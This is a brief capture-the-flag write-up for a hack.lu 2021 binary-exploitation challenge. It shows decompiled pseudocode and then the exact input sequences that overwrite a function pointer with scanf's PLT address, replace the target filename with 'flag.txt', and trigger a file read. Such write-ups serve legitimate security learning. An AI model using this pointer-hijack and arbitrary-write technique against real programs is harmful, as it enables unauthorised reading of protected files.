hack.lu21

> NO PIE
> 

`f1056` edit function poiter of `.data: 22050` And this fucntion is called in `f4919` 

```cpp
// f4919 default
mul_2_param(int a1, int a2){
  currStonk += a2 * a1;
  return a2 * a1;
}
// f16 change method calc
int f16(){
  if ( (char *)modified_by_f1056 == (char *)mul_2_param )
    f1056(1056, sum_2_param, 0, 0);
  else
    f1056(1056, mul_2_param, 0, 0);
  return v0;
}
// f32
int f32_printStonk()
{
  printf("Your current stonks are roughly: %d\n", currStonk);
  return v0;
}
```

`f48` read from stonks.txt file

```cpp
// f39321
int f39321(int a1, int a2)
{
  int v2; // r3
  int (*v4)(); // [sp+14h] [bp-8h]

  v4 = 0;
  if ( a2 )
  {
    if ( a2 == 1 )
      v4 = mul_2_param;
    printf("s3cr3t debug %d (TODO remove in production)\n", v4);
  }
  else
    printf("s3cr3t debug %d (TODO remove in production)\n", &fileName);
  return v2;
}
```

We use `plt.scanf`, so any mem can be rewritten

send 1056 66928 0 0 to rewrite the function pointer to scanf function (66928 - plt.scanf)

send 4919 70140 139352 0 to call scanf function, the two parameters are the address of %s and filename (139352-addr of filename, 70140-%s)

send flag.txt, rewrite filename to flag .txt

send 48 0 0 0 execute the read file operation, you can read the flag.txt file
